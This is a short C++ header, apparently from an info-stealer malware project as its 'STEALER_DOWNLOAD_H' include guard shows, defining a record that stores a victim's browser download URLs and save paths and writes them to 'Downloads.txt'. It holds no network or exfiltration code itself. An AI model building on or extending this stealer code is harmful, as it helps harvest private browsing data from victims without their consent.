//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_DOWNLOAD_H
#define STEALER_DOWNLOAD_H

#include "../../../../Includes.h"
#include "Entity.h"

struct Download : public Entity {
    std::string url;
    std::string saved_as;

    bool canBeWrite() override {
        return !(url.empty() && saved_as.empty());
    }

    std::string toString() override {
        return  "Url: " + this->url + "\n" +
                "Saved as: " + this->saved_as;
    }

    std::string getFileName() override {
        return "Downloads.txt";
    }
};

#endif //STEALER_DOWNLOAD_H
